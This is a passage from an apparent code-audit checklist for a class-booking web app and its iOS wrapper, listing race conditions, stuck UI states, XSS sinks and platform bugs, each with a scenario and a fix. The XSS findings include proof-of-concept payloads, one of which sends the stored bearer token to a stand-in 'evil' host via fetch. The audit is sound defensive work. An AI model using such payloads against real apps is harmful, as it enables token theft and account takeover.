  - *Fix:* After `await _originalSubmitBooking(...)`, revert the optimistic state whenever the button does not contain '✓' (i.e. the original did not reach its success branch), not only when the session expired.

- [x] **[MEDIUM]** fetchMyBookings has no sequencing — a stale in-flight response wipes a booking made during the fetch — `js/app.js:227`
  - fetchMyBookings rebuilds the whole map with `_myBookings = {}` (app.js:227) from whatever GET /bookings response arrives, with no sequence/abort guard. It is triggered concurrently from many places: visibilitychange (app.js:300), checkAuth (app.js:362), pull-to-refresh (interactions.js:82), processOfflineQueue (reliability.js:473), executeSpotSwap (app.js:3138), partial-cancel reconciliation (app.js:1931). The retry-wrapped apiFetch (reliability.js:168-206) can stretch a single GET to 45+ seconds across backoffs, so the response can reflect a server snapshot taken before a booking the user completed in the meantime; when it lands, the rebuilt map lacks the new booking. Two overlapping calls …
  - *Scenario:* App returns to foreground → visibilitychange starts fetchMyBookings; the first attempt 500s and backs off ~1-3s; during that window the user books a class ('Booked ✓' appears, _myBookings updated) → the retried GET (server snapshot from before the POST) resolves → `_myBookings = {}` rebuild drops the new booking → it vanishes from My Bookings and re-rendered cards show 'Book' again for a class the user is in (re-booking then hits the 409 'already…
  - *Fix:* Add a module-level sequence counter like _searchSeq: capture `mySeq = ++_bookingsSeq` at entry and abandon the response (skip the `_myBookings = {}` rebuild) if `mySeq !== _bookingsSeq`; optionally merge instead of replace for bookings newer than the request start.

- [x] **[MEDIUM]** triggerAutoSearch's cached-window fast path neither bumps _searchSeq nor cancels an in-flight search, letting stale results overwrite the user's view — `js/app.js:590`
  - When the requested date range matches the cached window, triggerAutoSearch renders instantly and returns (app.js:588-592) without incrementing _searchSeq, without clearing the pending `_autoSearchTimer`, and without setting _searchAborted. Any search still in flight for a DIFFERENT date range remains the current seq (`stale()` is false, app.js:984), so its progressive renders (app.js:1094) and final render + `_setWindow` (app.js:1103-1105) execute after the user's instant render, appending the other range's day groups into the results container (render is incremental, app.js:2164-2203) and switching `_windowKey` to the abandoned range. onDiscoverSearch (app.js:831-835) has the same flaw.
  - *Scenario:* On a cached 7-day window the user taps '14 days' (debounced search starts fetching, slow network), then 2s later taps '7 days' → the 7-day view renders instantly and the button shows '7 days' active → seconds later the still-running 14-day fetch streams in and appends days 8-14 to the list and stamps the window as 14-day, so the displayed results contradict the selected date range.
  - *Fix:* In the fast path, run `++_searchSeq` (and `clearTimeout(_autoSearchTimer)`) before renderFromWindow so any in-flight fetch becomes stale, mirroring what revalidateWindow does at app.js:928.

- [x] **[MEDIUM]** processOfflineQueue is not re-entrant — flapping connectivity replays the queue concurrently and can resurrect completed items — `js/reliability.js:370`
  - processOfflineQueue is bound directly to the 'online' event (reliability.js:511) with no in-progress guard. The browser fires 'online' on every reconnect, so a flapping network starts multiple concurrent runs that each read the same queue snapshot (line 371) and each replay every item (duplicate POST /bookings and DELETE calls). Worse, each run ends with `saveOfflineQueue(remaining)` (line 457): if run A finishes successfully and saves [], a slower run B that hit a transient 5xx then saves its own `remaining`, resurrecting an item A already completed — so a cancel or booking gets replayed yet again on the next 'online' event. A resurrected cancel with empty bookingIds falls back to `DELETE /…
  - *Scenario:* User cancels a class while offline (queued); on a train, connectivity flaps and 'online' fires twice → two concurrent replays run; one gets a 502 on the DELETE and re-saves the item after the other cleared the queue → user later re-books the same class → next reconnect replays the orphaned cancel by event_id and silently cancels the new booking.
  - *Fix:* Add a `_processing` flag (set at entry, cleared in finally, with a trailing re-check), and reconcile the saved queue against the current stored queue rather than overwriting it with a stale snapshot.

- [x] **[MEDIUM]** _eventCache entries are never refreshed, so the class detail sheet shows stale availability and can block booking — `js/app.js:2072`
  - render() only inserts into _eventCache when the id is absent (`if (!_eventCache[String(e.id)])`, app.js:2072), and fetchMyBookings (app.js:253) and bookWeeklyTemplate's fetchDay (app.js:3696) do the same — nothing ever updates an existing entry. After revalidateWindow/refreshWindow fetches fresh events, the cards render from the fresh objects but the cache keeps the first-seen snapshot. openClassDetail reads availability exclusively from the cache (app.js:3487-3508): if the cached entry says `is_fully_booked` it renders a disabled 'Full' button even when the class now has space; the reverse shows 'Book' with an outdated spots count for a now-full class. bookClass's `evtData.is_fully_booked ?…
  - *Scenario:* User keeps the PWA open all day; a class that was full at first render frees up; pull/Refresh updates the card to show '2 spots left', but tapping the card opens the detail sheet with a disabled 'Full' button (stale cache) — the user cannot book from the sheet even though the class is bookable (and vice versa, the sheet can offer 'Book' with a stale spots count on a now-full class).
  - *Fix:* In render() (and the other two cache writers), always overwrite the cached entry (or at least refresh is_fully_booked / is_waitlistable / capacity_remaining / start_at) instead of skipping existing ids.

- [x] **[LOW]** Init IIFE's favourites merge races interactions.js's polled restoreFilters, corrupting the restored instructor filter — `js/app.js:541`
  - interactions.js restores saved filters by polling for `instructors.length > 0` (interactions.js:465-481). On repeat visits, performance.js's eagerCachePrePopulate fills `instructors`/`locations` from localStorage at script parse time (performance.js:330-344), so restoreFilters can run (~DOMContentLoaded+200ms) BEFORE app.js's async init IIFE finishes awaiting securityReady + the three list fetches. When the init IIFE then completes, it unconditionally ADDs every favourite instructor to selectedInstructors (app.js:540-544) without clearing, on top of the just-restored saved selection, and then runs the launch search (app.js:567-569) with the merged set. The winner of this race depends on Inde…
  - *Scenario:* User has favourites Y and Z but last searched with only instructor X selected (persisted to psycle_saved_filters). On the next visit with warm caches, restoreFilters sets {X} at ~200ms; the init IIFE resolves at ~400ms and adds Y and Z → the launch search and chips show X, Y, Z instead of the user's saved filter X.
  - *Fix:* Gate the favourites pre-selection on 'no saved filters restored' (e.g. skip it if psycle_saved_filters has instructorIds), or run restoreFilters from the init IIFE itself after the favourites step instead of via an independent poll.

- [x] **[LOW]** bookTemplateWeek has no re-entrancy guard — a double tap launches two concurrent booking sweeps — `js/tabs.js:692`
  - window.bookTemplateWeek (tabs.js:692-714) neither disables its trigger button nor guards against concurrent invocation, and bookWeeklyTemplate (app.js:3664) only checks `_myBookings` — which is not updated until each submitBooking succeeds — before booking each matched event (app.js:3724, 3750). Two overlapping runs therefore both pass the already-booked checks for every template entry and both call _bookEventHeadless, issuing duplicate POST /bookings for the same events. For slot-layout classes both runs pick the same slot (app.js:3644-3647) so the second usually fails server-side, but for no-layout classes the second POST {event_id} may create a second seat/booking (the app itself supports…
  - *Scenario:* User taps 'Book my template week', sees no immediate feedback besides a toast, and taps again within a second → two concurrent sweeps each POST bookings for all template entries → for a no-layout class the user ends up with two seats booked (extra class credit consumed) and a confusing 'N failed' toast for the slot-conflict duplicates.
  - *Fix:* Add a module-level in-progress flag in bookTemplateWeek (and disable the button while awaiting), mirroring explore.js's `_syncing` guard.

## 5. Stuck UI states

- [x] **[MEDIUM]** One studio failing mid multi-studio search leaves a permanent 'found so far…' spinner — `js/app.js:1097`
  - In the all-studios search path, each location promise increments `done` and calls render(allEvents, relations, filters, done === total) (js/app.js:1087-1094). If any fetchEventsForLocation rejects (non-ok → throw, js/app.js:724-726, after fetchWithRetry exhausts 3 retries), `await Promise.all(promises)` (js/app.js:1097) rejects immediately and the catch shows an error status (js/app.js:1112). But the surviving location promises keep running — stale() is false because _searchSeq didn't change — and when they resolve they call render(), overwriting the error message with partial results. Since one promise failed, `done` can never equal `total`, so render's summary keeps the spinner and 'found …
  - *Scenario:* User searches 'All studios'; one location's /events endpoint 500s through all retries while the other locations respond slightly later → the results list shows classes from the healthy studios but the summary bar shows a spinning loader with 'N classes found so far…' indefinitely, with no error and no way to tell one studio is missing; it persists until the user changes a filter or searches again.
  - *Fix:* Use Promise.allSettled (or wrap each location promise in its own try/catch) so partial failures are counted toward `done`; after all settle, render with done=true and show a non-destructive banner naming the studios that failed.

- [x] **[LOW]** Tapping Stop mid-search leaves a permanent 'Connecting…' spinner or spinner summary — `js/app.js:1035`
  - While a search is in flight the search button becomes 'Stop' with onclick setting window._searchAborted = true (js/app.js:1032-1036). Aborting makes stale() true, so the fetch loops break and the entire post-fetch block — final render, setStatus, window caching (js/app.js:1101-1110) — is skipped; the catch is also skipped. The finally block restores the Search button (js/app.js:1115-1120), but #results is left holding whatever was last written: the '<span class="spinner"></span>Connecting…' status (set at js/app.js:1039) if nothing rendered yet, or partial results whose summary bar still shows the spinner and 'found so far…' (js/app.js:2157-2160). Neither is ever cleared until the user runs …
  - *Scenario:* User starts a 14-day all-studio search, immediately taps 'Stop' before the first page renders → the results area shows an animated 'Connecting…' spinner indefinitely even though nothing is loading; on iOS the skeleton/status sits there until the user changes a filter or taps Search again.
  - *Fix:* In the finally block (or when _searchAborted is set), replace the status with a 'Search stopped — tap Search to retry' message and re-render the last summary with done=true so no spinner remains.

## 6. Security & XSS

- [x] **[HIGH]** Unescaped API strings in bike-picker subtitle innerHTML — `js/app.js:1323`
  - showBikePicker builds the modal subtitle with `sub.innerHTML = `<span class="modal-subtitle-line">${line1}</span>...${line2}`` where line1 = [_evt._typeName, _evt._instrName, date] and line2 = [_evt._locName, _evt._studioName] (js/app.js:1320-1323). All four values are raw API strings cached in _eventCache (set from type?.name, instr?.full_name, loc.name, studio.name at js/app.js:274-279) and are NOT passed through escapeHTML, unlike every other sink in this function's vicinity. No later module wraps showBikePicker. Any HTML in an instructor/class-type/location/studio name from the API executes with access to the bearer token (getBearerToken() is a global).
  - *Scenario:* API returns an event whose instructor full_name or event-type name contains `<img src=x onerror=alert(document.title)>`; user taps Book on that class card → bike picker opens → the payload is parsed as HTML in the modal subtitle and the script runs in the app's origin.
  - *Fix:* Wrap line1 and line2 in escapeHTML() before interpolation: `${escapeHTML(line1)}` / `${escapeHTML(line2)}`.

- [x] **[HIGH]** Unescaped API strings in post-booking confirmation innerHTML — `js/app.js:1632`
  - showBookingConfirmation interpolates `classLine` (built at js/app.js:1622 from evt._typeName and evt._instrName, both raw API strings) directly into el.innerHTML at js/app.js:1632 (`<div class="bc-detail">${classLine}</div>`) with no escapeHTML. Same root data as the bike-picker finding but a separate sink; reached on every successful booking and waitlist join. No monkey-patch from a later module alters this function.
  - *Scenario:* User books (or joins the waitlist for) a class whose class-type or instructor name from the API contains an HTML payload → the slide-up "Booked!" confirmation renders the payload as live HTML and arbitrary JS executes.
  - *Fix:* Use `${escapeHTML(classLine)}` (and escape dateTimeStr/slotStr for consistency, though those are locally formatted).

- [x] **[HIGH]** Explore instructor cards interpolate raw instructor name into onclick attribute — `js/explore.js:750`
  - instrCard does `var nameEscaped = profile.name.replace(/'/g, "\\'")` (js/explore.js:750) — only single quotes are backslash-escaped; the value is never HTML-escaped — then injects it into a double-quoted onclick attribute at js/explore.js:754-756 (`onclick="event.stopPropagation();window._features_openInstructorModal('<name>','<id>')"`). profile.name comes from the API (`name: instr.full_name`, js/explore.js:99) or synced history instrName (js/explore.js:551). A `"` in the name terminates the onclick attribute and lets the attacker add arbitrary attributes (e.g. onpointerover=...); `&#39;`-style entities can also desynchronize the JS string. The visible text at line 757 is escaped, but the a…
  - *Scenario:* An instructor record with full_name `X" onpointerover="fetch('https://evil/?t='+localStorage.psycle_bearer_token)` appears in the Discover tab's "New to you" / "You might like" grid → the injected handler fires when the user's pointer crosses the card name → token exfiltrated.
  - *Fix:* Render names with textContent or a delegated click handler keyed on data-instr-id (as done for habit cards in tabs.js), or at minimum HTML-escape including quotes before attribute interpolation.

- [x] **[MEDIUM]** escapeHTML does not escape quotes — breaks out of double-quoted HTML attributes — `js/security.js:22`
  - window.escapeHTML (js/security.js:20-25) uses the div.textContent→innerHTML trick, which escapes & < > but NOT " or '. Throughout the app its output is placed inside double-quoted attributes: instrLink's onclick (js/app.js:148-156, used in every class card via eventCard js/app.js:2050), title attributes in the weekly planner (js/tabs.js:583-585, 604-605), img src/alt in the instructor modal (js/features.js:270) and class-detail sheet (js/app.js:3537). A double-quote in an API-supplied instructor name, photo URL, or class-type name closes the attribute and permits injection of new attributes such as event handlers ( < and > are escaped, so element injection is blocked, but attribute injection…
  - *Scenario:* Instructor full_name contains `Sam" onpointerenter="<payload>` → escapeHTML leaves the quote intact → instrLink emits `<span class="instructor-link" onclick="...openInstructorModal('Sam" onpointerenter="...')">` in every search-result card → injected handler executes when the user hovers/taps the name.
  - *Fix:* Make escapeHTML also replace " with &quot; and ' with &#39; (string-replace implementation instead of the textContent trick), since it is used in attribute contexts app-wide.

- [x] **[LOW]** file:// mode sends Authorization bearer header through third-party corsproxy.io — `js/app.js:38`
  - apiUrl (js/app.js:38-42) routes every API call through `https://corsproxy.io/?<encoded-url>` whenever location.protocol is file: (js/app.js:28-29), and apiFetch / the reliability.js replacement both attach `Authorization: Bearer <token>` to that request (js/app.js:52, js/reliability.js:225), so corsproxy.io sees the bearer token plus all profile/booking data on every request. Mitigations: this only happens when the HTML is opened directly from disk (the Capacitor iOS app uses capacitor://, not file:), and a visible red banner discloses it (psycle-finder.html:117-120: "Your auth token is visible to this proxy"). Still a real token-disclosure path to an uncontrolled third party, severity calib…
  - *Scenario:* User double-clicks psycle-finder.html (file://) while a token is stored → every search/booking request, with the bearer token in its Authorization header, transits corsproxy.io, which can read or log it.
  - *Fix:* Refuse to attach the Authorization header in proxy mode (read-only browsing) or drop the proxy fallback entirely now that local serving is documented.

- [x] **[LOW]** XOR 'encryption' fallback is obfuscation with a hardcoded key, stored under the _enc key and applied silently — `js/security.js:105`
  - When crypto.subtle/IndexedDB are unavailable (file://, plain-http LAN) or key init times out (js/security.js:196-202), the token is XOR-encoded with the hardcoded constant `'pSyCl3F1nD3r_2025!'` (js/security.js:105-113) and written to localStorage under `psycle_bearer_token_enc` (js/security.js:162) — the same key name used for real AES-GCM ciphertext, and the key name/docs present it as encrypted. XOR with a key shipped in public source provides zero confidentiality. The code comments do label it a fallback, but unlike the plaintext fallback (which logs a loud console warning and an error-log entry, js/security.js:168-172), the XOR path emits no warning at all, so the user has no signal the…
  - *Scenario:* App is served over plain http on a LAN (crypto.subtle undefined) → token stored as XOR under psycle_bearer_token_enc with no warning → anything that can read localStorage (backup extraction, shared machine) trivially decodes the bearer token with the key from the public JS source, while the _enc key name suggests it was encrypted.
  - *Fix:* Log the same loud downgrade warning used for the plaintext fallback when the XOR path is taken, and/or store XOR output under a distinct key (e.g. psycle_bearer_token_obf) so it is never mistaken for AES-GCM ciphertext.

## 7. iOS / platform

- [x] **[HIGH]** Weekly 'Monday 11:59 UK' reminder scheduled at garbage hour whenever local date differs from UK date — `ios-app/www/native-bridge.js:839`
  - _ukHourInLocalTime (native-bridge.js:830-845) computes the offset as parseInt(local hour-of-day) - parseInt(UK hour-of-day) with no date component. Whenever the UK calendar day differs from the device's local day at the moment of scheduling, the diff is off by ±24. Example: New York user opens the app Monday 20:00 ET (UK is 01:00 Tuesday): diff = 20 - 1 = 19, localHour = 11 + 19 = 30, and LocalNotifications.schedule is called with hour: 30 (native-bridge.js:873-889) — an invalid DateComponents hour, so the reminder never fires at 11:59 UK. Paris user at 00:30 local (23:30 UK): diff = 0 - 23 = -23 → hour: -12. Worse, the silent launch-time reschedule (native-bridge.js:919-921) cancels the exi…
  - *Scenario:* User with the weekly reminder enabled travels to New York and opens the app Monday evening (any local time 19:00-23:59 when UK has rolled to Tuesday) → the launch reschedule cancels the working reminder and schedules one at hour 30 → the 'booking week opens' notification silently stops arriving; it stays broken until the app happens to be launched while local and UK dates match.
  - *Fix:* Compute the next occurrence of Monday 11:59 Europe/London as an absolute timestamp (using Date parts formatted with timeZone:'Europe/London') and schedule with `at:` plus a re-schedule on fire/launch, instead of deriving an hour-of-day offset.

- [x] **[HIGH]** Service worker SHELL list is stale: facets.js, redesign.css, discover-layout-fix.css and two fonts never cached — broken offline PWA — `sw.js:2`
  - psycle-finder.html now loads css/redesign.css (line 21), css/discover-layout-fix.css (line 22) and js/facets.js (line 200), and theme.css declares bricolage.woff2/hanken.woff2 fonts — but the hand-maintained SHELL array in sw.js (lines 2-26) still lists only the old 6 CSS + 14 JS files + display.woff2. build.js content-hashes the CACHE version (so versioning is fine, as CLAUDE.md claims) but nothing regenerates the SHELL list. The fetch handler's asset branch is `caches.match(e.request).then(cached => cached || fetch(e.request))` (sw.js:204) — it never puts network responses into the cache, so the missing assets are not even runtime-cached. Offline, the precached HTML loads but redesign.css/…
  - *Scenario:* PWA user who has 'installed' the app opens it on the tube with no connectivity → shell HTML loads from cache but redesign.css, discover-layout-fix.css, facets.js, bricolage/hanken fonts all 404 (not in cache, network unreachable) → visually broken layout with wrong fonts and degraded Discover filters, despite the app claiming offline support.
  - *Fix:* Have build.js generate the SHELL array from the same auto-discovered js/css/font file lists it already computes (it knows exactly what shipped), or add a cache.put in the cache-first asset branch.

- [x] **[MEDIUM]** iOS status bar never adapts to theme: StatusBar plugin not installed, and the check tests a theme id that no longer exists — `ios-app/www/native-bridge.js:1189`
  - updateStatusBar (native-bridge.js:1187-1202) guards on Capacitor.Plugins.StatusBar, but @capacitor/status-bar is not in ios-app/package.json dependencies (only browser/core/haptics/ios/local-notifications/preferences/share/calendar) and has no entry in package-lock.json — so the whole function is a permanent no-op and the MutationObserver wiring (lines 1200-1202) is dead code. Even if the plugin were installed, the logic `if (theme === 'light')` is stale: APP_THEMES (js/theme.js:25-33) contains cloud/linen (base light) and graphite/terminal/synthwave/gameboy/blueprint (base dark) — there is no 'light' id — so every theme including the light-background default 'cloud' would take the else bran…
  - *Scenario:* iOS user switches to the Graphite or Terminal theme (bg #131418 / #060906) → the status bar clock/battery stay default dark text on a near-black background → unreadable status bar for the entire session; the code written to fix exactly this never executes.
  - *Fix:* Add @capacitor/status-bar to ios-app/package.json and key the style off the theme's `base` from window.APP_THEMES (base === 'light' → DARK text) instead of the removed 'light' id.

- [x] **[MEDIUM]** Partial Preferences migration: waitlist, weekly template, bike history, recent searches, onboarding and reminder flags not mirrored — `ios-app/www/native-bridge.js:72`
  - SYNC_KEYS (native-bridge.js:72-84) omits several keys the app persists (per CLAUDE.md and code): psycle_waitlisted_events (waitlist badges), psycle_weekly_template (one-tap book-my-week), psycle_bike_history (usual-spot preselection), psycle_recent_searches, psycle_onboarded_v1, psycle_api_contract, and notably psycle_weekly_reminder (REMINDER_PREF, defined at native-bridge.js:847 — the bridge's OWN opt-in flag). After a WKWebView purge these are gone while the 'protected' keys return. The REMINDER_PREF case is the worst: the iOS notification remains scheduled in the system (it is only cancelled via disable()), but isOn() now returns false and the launch-time reschedule (lines 919-921) is sk…
  - *Scenario:* iOS purges website data → user's joined-waitlist badges, weekly booking template, usual-bike preselection and recent-search pills vanish, and the onboarding tour replays as if freshly installed; meanwhile the Membership reminder toggle shows OFF yet the Monday 11:59 notification keeps firing every week (still registered with iOS), and its DST offset is never recalculated because the reschedule path checks the lost flag.
  - *Fix:* Add the missing keys (at minimum psycle_weekly_reminder, psycle_waitlisted_events, psycle_weekly_template, psycle_bike_history, psycle_onboarded_v1) to SYNC_KEYS, or mirror every 'psycle_'-prefixed key generically.

- [x] **[MEDIUM]** ICS export / 'Add to Calendar' web UI is broken inside the iOS app and not hidden there — `ios-app/www/native-bridge.js:56`
  - calendar.js renders Download/.ics and 'Add to Calendar' buttons unconditionally (calendar.js:277-279) — nothing gates them on window.Capacitor. On iOS: (1) openICSInCalendar does window.open(blobUrl,'_blank') (calendar.js:218-226); the bridge deliberately passes blob: URLs to the original window.open (native-bridge.js:55-56), but WKWebView has no download manager or popup — Capacitor's WKUIDelegate loads the request into the main web view, replacing the running app with raw ICS text (or doing nothing), never invoking the system calendar. (2) downloadICS uses an <a download> blob click (calendar.js:187-198), unsupported in WKWebView, yet still toasts 'Calendar file downloaded'. (3) getCalenda…
  - *Scenario:* iOS app user taps '📅 Add to Calendar' on a booking → either nothing happens or the web view navigates to a page of raw VCALENDAR text requiring an app restart; tapping 'Download' shows a success toast but no file exists anywhere. The working native EventKit path exists right next to this dead UI.
  - *Fix:* When window.Capacitor is present, hide the ICS/webcal buttons (route to the native calendar sync instead), or have the bridge's window.open intercept blob: URLs and hand the content to the Share/Filesystem plugin.

- [x] **[LOW]** Toolchain version mismatches: Capacitor CLI 8 driving a Capacitor 6 project; calendar code documented against plugin v8 but v6.7.2 installed — `ios-app/package.json:24`
  - ios-app/package.json pins @capacitor/core, ios, and all plugins at ^6.0.0 but devDependencies has @capacitor/cli ^8.3.0 — two majors ahead of core. `npm run sync` runs `npx cap sync ios` with that CLI against the v6 project, which Capacitor does not support (CLI major must match core major) and can fail or mis-sync the native project. Separately, native-bridge.js:167 states the calendar integration 'Uses @ebarooni/capacitor-calendar v8 plugin', but package.json pins ^6.0.0 and package-lock resolves 6.7.2 (package-lock.json:135-137); every Calendar.* call in the bridge is wrapped in try/catch that silently returns false/[]/null (e.g. native-bridge.js:218-221, 233-236, 323-326), so any v6-vs-v…
  - *Scenario:* Developer runs `cd ios-app && npm install && npm run sync` → cap CLI 8 refuses or mishandles the Capacitor 6 iOS project, so www changes never reach the device build; and if the calendar plugin API drifted between the installed 6.7.2 and the v8 the code targets, users who pick a calendar see bookings silently never appear in iOS Calendar with zero logged errors.
  - *Fix:* Pin @capacitor/cli to ^6 (matching core) or upgrade the whole stack together; verify the @ebarooni/capacitor-calendar 6.7.2 API surface against every method/option native-bridge.js calls and correct the comment or the dependency.

## 8. Cross-cutting (critic round)

- [x] **[MEDIUM]** Tier badges never render on Discover cards: settings.js regex targets markup removed in the card redesign — `js/settings.js:711`
  - settings.js wraps eventCard to inject the user's instructor tier badge via html.replace(/(class-instructor">)(.*?)(<\/div>)/, ...) (js/settings.js:705-717). The current eventCard output (js/app.js:2042-2060) no longer contains a 'class-instructor' element — the instructor is rendered inside <span class="cc-sub"> (app.js:2050). 'class-instructor' now only appears in the My Bookings card built inline in renderMyBookings (app.js:2868), which does not go through eventCard. The replace therefore never matches and silently returns the card unchanged.
  - *Scenario:* User ranks instructors S–F in Membership → Instructor rankings, then searches in Discover → no tier badge appears on any class card, even though CLAUDE.md and the settings UI promise tier badges on cards. The feature fails silently with no error.
  - *Fix:* Update the injection to target the current markup, e.g. replace inside the cc-sub span after the instructor-link span, or better: have app.js eventCard call tierBadgeHTML(evt.instructor_id) directly and drop the fragile regex patch.

- [x] **[MEDIUM]** tests/unit.js quote-escaping assertions are vacuous: the DOM shim escapes quotes that real browsers (and the shipped escapeHTML) do not — `tests/unit.js:131`
  - The test harness models textContent→innerHTML with an escape map that includes '"'→&quot; and '\''→&#39; (tests/unit.js:123-132, 164-174). Real browsers only escape & < > when serializing text nodes, and production escapeHTML is exactly div.textContent→div.innerHTML (js/security.js:21-25) — the already-confirmed quote-escaping gap. Assertions at tests/unit.js:284-285 ('escapes "', "escapes '") and 298-301 (XSS payload "x');alert(1)//" has no raw quote) therefore test the shim, not the code: they pass against any implementation run under this shim. Verified: node tests/unit.js reports 42/42 passing, and this suite is a blocking CI gate (.github/workflows/ci.yml 'Unit tests' step).
  - *Scenario:* A developer relies on the green 'escapes "' / XSS-payload assertions (or CI) as evidence that escapeHTML output is safe inside double-quoted HTML attributes, and keeps interpolating escapeHTML(...) into attribute contexts — in a real browser the quote survives and breaks out of the attribute (the known js/security.js:22 bug), while the test suite certifies the opposite.
  - *Fix:* Make the shim browser-accurate (escape only & < > in text serialization) so the quote assertions fail honestly, then fix escapeHTML to explicitly escape " and ' (string replace map instead of the div trick) and keep the strict assertions.

- [x] **[MEDIUM]** Calendar export writes waitlisted classes as STATUS:CONFIRMED events — `js/calendar.js:42`
  - syncCalendarData iterates every entry of _myBookings with no check of booking.waitlisted (js/calendar.js:40-77; grep confirms the word 'waitlisted' never appears in calendar.js), and generateICS emits STATUS:CONFIRMED for every entry (calendar.js:176). Waitlist joins are stored in _myBookings with waitlisted:true (js/app.js:1556 and re-applied at app.js:246-249), so they are exported identically to real bookings. The same applies to the SW-generated .ics (sw.js:118) and addToGoogleCalendar, which may pick a waitlisted class as 'the next class' (calendar.js:237-247).
  - *Scenario:* User joins a waitlist for Saturday 9am, then taps 'Add to Calendar' in My Bookings → the waitlisted class lands in Apple/Google Calendar as a confirmed event with travel-time alerts. The user shows up to a class they were never admitted to (or blocks the slot in their calendar), with no indication it was waitlist-only.
  - *Fix:* In syncCalendarData, skip entries where booking.waitlisted is true (or export them with STATUS:TENTATIVE and a 'Waitlisted' prefix in SUMMARY), and exclude them from addToGoogleCalendar's 'next upcoming' selection.

- [x] **[LOW]** ICS TEXT values are not RFC 5545-escaped: commas/semicolons in LOCATION, SUMMARY and DESCRIPTION emitted raw — `js/calendar.js:158`
  - generateICS pushes 'SUMMARY:'+summary, 'LOCATION:'+locDisplay and 'DESCRIPTION:'+description without escaping , ; or backslash (js/calendar.js:157-159); the LOCATION value is deliberately built with commas — fullAddress = locFullName + ', ' + apiAddress (calendar.js:55), and API street addresses contain more commas. RFC 5545 §3.3.11 requires COMMA and SEMICOLON to be escaped in TEXT values. The escaping helper exists but is applied only to the X-APPLE-STRUCTURED-LOCATION parameter (calendar.js:166-168). The SW copy has the identical flaw (sw.js:106-108). A class type or studio name containing ';' would corrupt the property; commas make strict parsers (Outlook, some CalDAV servers) truncate o…
  - *Scenario:* User downloads psycle-classes.ics and imports into Outlook/a strict CalDAV client → the event location is truncated at the first comma (e.g. shows only 'Psycle Oxford Circus') or the import of that VEVENT fails validation, so the address/map pin the feature exists for is lost.
  - *Fix:* Apply a shared escapeIcsText(s) { return s.replace(/\\/g,'\\\\').replace(/;/g,'\\;').replace(/,/g,'\\,').replace(/\n/g,'\\n'); } to SUMMARY, LOCATION and DESCRIPTION values in both js/calendar.js and sw.js.

- [x] **[LOW]** login.html Enter key bypasses the disabled button: duplicate concurrent login POSTs and error flash on the success screen — `login.html:141`
  - A document-level keydown listener calls doLogin() directly on every Enter press (login.html:140-142). doLogin's only guards are checkRateLimit and non-empty fields (login.html:154-164); the in-flight state is expressed solely by btn.disabled (login.html:167), which the keyboard path never checks. Pressing Enter again while a login request is pending fires a second POST to /auth/login with the same credentials. After a successful login, the listener stays attached during the 1.2-1.5s 'Connected' interstitial (login.html:192-195); Enter then re-invokes doLogin, which — password having been cleared at login.html:189 — flashes 'Please enter your email and password.' over the success screen.
  - *Scenario:* User types credentials and taps Enter twice on a slow connection → two identical login requests race (extra server-side auth attempts, potential server rate-limiting); or user presses Enter on the 'Connected' screen → a red validation error appears on top of the success state just before redirect.
  - *Fix:* Guard doLogin with an _inFlight flag (set before fetch, cleared in finally) and early-return when set or when the sDone screen is visible; alternatively have the keydown handler no-op when document.getElementById('loginBtn').disabled is true or sLogin is hidden.

## Disputed (verifiers split — re-check before/while fixing)

- [x] **[MEDIUM]** My Bookings billing-period bucketing parses period_start/period_end without the space→T normalization used everywhere else (Invalid Date on iOS WebKit) — `js/app.js:2654`
  - app.js parses the subscription period fields raw: `new Date(_activeSubscription.period_start)` / `period_end` (js/app.js:2654-2655), plus `new Date(periods[0].start)` (2657, 2769). The same codebase deliberately normalizes these exact fields with `String(sub.period_start).replace(' ', 'T')` in tabs.js:1223-1224 (and does the same for start_at in tabs.js:575/598, app.js:1450), because Safari/iOS WebKit returns Invalid Date for 'YYYY-MM-DD HH:MM:SS'. If the API emits the space-separated form these…
  - *Dispute:* REAL: The cited code is exactly as claimed and the downstream trace checks out step-by-step. js/app.js:2654-2655 parse raw: `periodStart = _activeSubscription.period_start ? new Date(_activeSubscription.period_start) : null` (same for period_end), and js/app.js:2657 and 2769 parse `periods[0].start` / `nextPeriod.start|end` raw. By contrast js/tabs.js:1223-1224 normalize the identical fields: `new Date(String(sub.period_start).replace(' ', 'T'))`, and the replace(' ','T') Safari workaround is applied to API datetimes at 13 sites (js/app.js:738,1077,1450,3789,4263; js/tabs.js:575,598,646,803,89…

- [x] **[MEDIUM]** Leaving a waitlist (or cancelling) never removes the event from psycle_waitlisted_events — `js/app.js:1445`
  - psycle_waitlisted_events entries are only ever removed by the time-based sweep _cleanWaitlisted (js/app.js:1445-1457) once the class start passes. Neither upcomingCancel (3310-3392, the 'Leave waitlist' button at 2835) nor confirmUnbook deletes the map entry. fetchMyBookings re-applies `waitlisted = true` to any current booking whose eventId is in the map (app.js:246-248), and the badge renders unconditionally from that flag (2804) with the cancel button labelled 'Leave waitlist'. (Currently lat…
  - *Dispute:* REAL: psycle_waitlisted_events (WAITLIST_KEY, js/app.js:1436) is written only by _markWaitlisted (1440-1444) and deleted only by the time-based sweep _cleanWaitlisted (1445-1457, guard `if (startAt && startTime < now)` at 1450). No cancel path removes entries: upcomingCancel success branch (js/app.js:3351-3368) only does `delete _myBookings[String(eventId)]` at 3352; confirmUnbook success branch (1908-1920) likewise at 1909; cancelBikeSlot (1830-1836) likewise; offline branches (3322-3340, 1884-1898) likewise. features.js cancel wrappers (176-201) only call markHistoryCancelled, and no 'bookin…

- [x] **[LOW]** Service-worker ICS generator hardcodes 'Bike' slot labels, drifting from the main generator's Bed/Bench/Spot logic — `sw.js:70`
  - sw.js has its own copy of the ICS builder for the /psycle-calendar.ics route, and its _swSlotLabel returns 'Bike N' / 'Bikes ...' unconditionally (sw.js:68-72), while the page-side generator resolves the correct noun per class type via slotLabel — Bed for Reformer/Pilates, Bench for Strength (js/calendar.js:108-112, js/app.js:107-116). The two generators produce different SUMMARY/DESCRIPTION text for the same booking.
  - *Dispute:* REAL: sw.js:68-72 `_swSlotLabel(slots)` takes only the slots array and unconditionally returns 'Bike ' + slots[0] (single) or 'Bikes ' + slots.join(' & ') (multiple); it never looks at class type, even though the entry's typeName is available — sw.js:87 calls `_swSlotLabel(entry.slots)` and sw.js:88-90 uses `entry.typeName` right next to it for the summary prefix. This label is embedded in both SUMMARY (sw.js:91) and DESCRIPTION (sw.js:95) of the SW-generated ICS. The page-side generator differs: js/calendar.js:108-112 `_slotLabel(slots, typeName)` resolves the noun via `slotLabel(typeName)` t…

